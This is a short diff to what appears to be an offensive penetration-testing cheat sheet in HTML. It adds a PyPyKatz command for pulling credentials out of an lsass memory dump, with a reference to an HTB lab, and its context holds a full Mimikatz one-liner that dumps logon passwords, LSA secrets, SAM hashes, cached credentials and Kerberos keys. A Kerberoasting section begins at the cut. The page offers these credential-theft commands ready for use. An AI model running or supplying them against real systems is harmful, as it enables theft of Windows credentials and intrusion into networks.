@@ -195,6 +195,13 @@ Mimikatz One-Liner:
 
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "token::elevate" "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM sam.hiv security.hiv system.hiv" "lsadump::cache" "sekurlsa::ekeys" "exit"
 </code></pre>
+<h3 id="pypykatz"><a class="header" href="#pypykatz">PyPyKatz</a></h3>
+<p>https://en.hackndo.com/remote-lsass-dump-passwords/#linux--windows</p>
+<pre><code>If you come across a lsass dump file, like in HTB Blackfield, use this tool
+
+pypykatz lsa minidump lsass.DMP
+
+</code></pre>
 <h3 id="kerberoasting"><a class="header" href="#kerberoasting">Kerberoasting</a></h3>
 <pre><code>Service Account Attack -&gt; Kerberoasting attack.
 
